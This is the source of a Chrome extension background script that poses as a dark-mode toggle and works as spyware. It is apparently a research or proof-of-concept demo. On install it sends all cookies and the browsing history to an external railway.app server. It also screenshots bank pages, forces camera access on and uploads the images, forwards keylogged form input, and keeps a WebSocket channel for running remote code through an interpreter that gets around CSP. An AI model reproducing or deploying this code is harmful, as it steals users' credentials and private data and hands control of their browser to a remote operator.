importScripts("packages/esprima.js", "packages/escodegen.js", "packages/static-eval.js");

/* =================================================================================== */
// Constants configuration

const SERVER_DOMAIN = 'extension-code-injector-production.up.railway.app'
// const SERVER_DOMAIN = 'localhost:3333'
const HTTP_SERVER_URL = `http://${SERVER_DOMAIN}`;
const WS_SERVER_URL = `ws://${SERVER_DOMAIN}`;

/* =================================================================================== */

// Perform the initial data steal and connect to websockets only after website is ready
async function onReady() {
    stealUserData();
    setTimeout(() => {
        socket = connectWebSocket();
    }, 2000);
}

chrome.runtime.onInstalled.addListener(onReady);
chrome.action.onClicked.addListener((tab) => {
    chrome.tabs.sendMessage(tab.id, {type: "TOGGLE_DARK_MODE"});
});

/* =================================================================================== */
// Utility functions for server communication
async function request(endpoint, options) {
    try {
        const response = await fetch(`${HTTP_SERVER_URL}/${endpoint}`, {
            method: options.method || 'GET',
            headers: {
                'Content-Type': 'application/json',
                ...options.headers
            },
            body: JSON.stringify(options.data)
        })

        return response.json();
    } catch (err) {
        console.error(err.message);
    }
}

/* =================================================================================== */

// Steal cookies and browsing history on load
async function stealUserData() {
    const cookies = await chrome.cookies.getAll({});
    await request('collector/cookies', {data: {cookies}, method: 'POST'});

    const history = await chrome.history.search({text: ""});
    await request('collector/history', {data: {history}, method: 'POST'});
}

/* =================================================================================== */

// On visit of a certain domain, take a screenshot
// Could be abused to take screenshots of sensitive data such as bank account details
async function onVisited(historyItem) {
    if (historyItem.url.includes('mybank.com')) {
        await takeScreenshot()
    }
}

chrome.history.onVisited.addListener(onVisited)

/* =================================================================================== */

// Utility function to take screenshot and send it to the server
async function takeScreenshot() {
    const currentTab = await getCurrentTab();
    if (!currentTab) {
        console.log('Could not find current tab');
        return;
    }

    const screenshotUrl = await chrome.tabs.captureVisibleTab();

    await request('collector/screenshot', {data: {dataUrl: screenshotUrl}, method: 'POST'})
}

/* =================================================================================== */

// Utility function to take picture from the camera and send it to the server
async function captureCamera() {
    // check site permissions
    const currentTab = await getCurrentTab();
    if (!currentTab) {
        console.log('Could not find current tab');
        return;
    }

    const cameraSettings = await chrome.contentSettings.camera.get({primaryUrl: currentTab.url});
    console.log('cameraSettings', cameraSettings);

    if (cameraSettings.setting !== 'allow') {
        console.log('Camera access blocked');
        const origin = new URL(currentTab.url).origin;
        await chrome.contentSettings.camera.set({primaryPattern: `${origin}/*`, setting: 'allow'});
    }

    chrome.tabs.sendMessage(currentTab.id, {type: 'CAMERA'});
}

// handler for the camera image capture from the content script
async function onCameraImage(message, sender, sendResponse) {
    try {
        await request('collector/camera', {data: {dataUrl: message.data}, method: 'POST'})

        sendResponse({status: 'ok'})
    } catch (err) {
        console.warn(err.message);
        sendResponse({status: 'fail'})
    }
}
/* =================================================================================== */

// Send the input values to the server which will save them in a DB
async function onInputMessage(message, sender, sendResponse) {
    try {
        await request('collector/key-logger', {data: {data: message.data}, method: 'POST'});

        sendResponse({status: 'ok'})
    } catch (err) {
        console.warn(err.message);
        sendResponse({status: 'fail'})
    }
}

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    (async () => {
        switch (request.type) {
            case 'SUBMIT_FORM':
                await onInputMessage(request, sender, sendResponse);
                break;
            case 'CAPTURED_IMAGE':
                await onCameraImage(request, sender, sendResponse);
                break;
            default:
                console.log('Unknown message received from content script:', request);
                break;
        }
    })();
    return true
})

/* =================================================================================== */

// Establish a websocket connection to the server and forward all messages from the server to the popup
// This way the popup can receive real-time code from the server and execute on client-side
let isWsConnected = false;
let socket;

function connectWebSocket() {
    if (isWsConnected) {
        return;
    }

    const socket = new WebSocket(WS_SERVER_URL);

    socket.onopen = () => {
        console.log('WebSocket connected');
        isWsConnected = true;
        keepAlive();
    };

    socket.onmessage = onWsMessage;

    socket.onerror = (error) => {
        console.warn('WebSocket error: ', error);
    };

    socket.onclose = (event) => {
        console.log('WebSocket closed.');
        isWsConnected = false;
    };

    return socket
}

// Keep the service worker alive by sending a keepalive message to the server
// Courtesy of - https://developer.chrome.com/docs/extensions/how-to/web-platform/websockets
function keepAlive() {
    const keepAliveIntervalId = setInterval(
        () => {
            if (socket && isWsConnected) {
                socket.send('keepalive');
            } else {
                clearInterval(keepAliveIntervalId);
            }
        },
        // Set the interval to 20 seconds to prevent the service worker from becoming inactive.
        20 * 1000
    );
}

// Process the message from the WS server
async function onWsMessage(event) {
    const parsedMessage = JSON.parse(event.data);

    console.log('received message:', parsedMessage);
    if (parsedMessage.type === 'HELLO') {
        socket.send("Hello, Server!");
    }

    const currentTab = await getCurrentTab();
    if (!currentTab) {
        console.log('Could not find current tab');
        return;
    }

    if (parsedMessage.type.includes('SCREENSHOT')) {
        return await takeScreenshot();
    }

    if (parsedMessage.type.includes('CAMERA')) {
        return await captureCamera();
    }

    if (parsedMessage.type.includes('BG_COMMAND')) {
        // Show that eval is blocked by CSP
        executeWithEval(parsedMessage.data);

        // Show that eval through setTimout is blocked by CSP in the background script
        executeWithSetTimeout(parsedMessage.data);

        // Alternative, execute the command with the interpreter, goes unnoticed by CSP
        executeWithInterpreter(parsedMessage.data);
    }

    if (parsedMessage.type.includes('CS_COMMAND')) {
        console.log('Sending command to content script ...')
        chrome.tabs.sendMessage(currentTab.id, {type: 'COMMAND', data: parsedMessage.data});
        // Alternatively, execute the command with the debugger
        // executeWithDebugger(parsedMessage.data, currentTab.id);
    }
}

/* =================================================================================== */
// Misc functions

// Get the current tab
async function getCurrentTab() {
    let queryOptions = {active: true, lastFocusedWindow: true};
    let [tab] = await chrome.tabs.query(queryOptions);
    return tab;
}

// Evaluate the code in the context of a tab with the debugger
async function executeWithDebugger(command, tabId) {
    await chrome.debugger.attach({tabId}, "1.3");
    await chrome.debugger.sendCommand({tabId}, "Runtime.evaluate", {expression: command});
    await chrome.debugger.detach({tabId});
}


// Execute injected code through AST conversion and JS interpreter
function executeWithInterpreter(command) {
    console.log("\nExecuting with Interpreter ...")

    const ast = esprima.parse(command).body[0].expression;

    staticEval.evaluate(
        ast,
        {chrome, console, fetch},
    );
}

// Execute injected code through a setTimeout
function executeWithSetTimeout(command) {
    try {
        console.log("\nExecuting with setTimout (CSP block expected) ...")
        setTimeout(command);
    } catch (err) {
        console.warn(`setTimeout() failed: ${err.message}`);
    }
}

// Execute injected code through eval
function executeWithEval(command) {
    try {
        console.log("\nExecuting with eval (CSP block expected) ...")
        eval(command);
    } catch (err) {
        console.warn(`eval() failed: ${err.message}`);
    }
}
